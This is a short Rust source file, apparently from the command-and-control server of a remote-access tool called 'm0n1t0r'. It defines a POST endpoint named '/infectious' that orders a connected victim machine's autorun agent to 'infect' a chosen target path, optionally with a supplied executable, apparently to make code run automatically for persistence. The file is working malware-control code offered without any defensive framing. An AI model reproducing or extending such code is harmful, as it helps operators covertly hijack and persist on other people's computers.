use crate::{
    ServerMap,
    web::{Response, Result as WebResult, api::client::autorun},
};
use actix_web::{
    Responder, post,
    web::{Data, Form, Json, Path},
};
use m0n1t0r_common::autorun::Agent as _;
use serde::Deserialize;
use std::{net::SocketAddr, path::PathBuf, sync::Arc};
use tokio::sync::RwLock;

#[derive(Deserialize)]
struct InfectiousForm {
    target: PathBuf,
    exe: Option<PathBuf>,
}

#[post("/infectious")]
pub async fn post(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
    Form(form): Form<InfectiousForm>,
) -> WebResult<impl Responder> {
    let (autorun_agent, _) = autorun::agent(data.clone(), &addr).await?;

    Ok(Json(Response::success(match form.exe {
        Some(exe) => autorun_agent.infectious_at(form.target, exe).await?,
        None => autorun_agent.infectious(form.target).await?,
    })?))
}
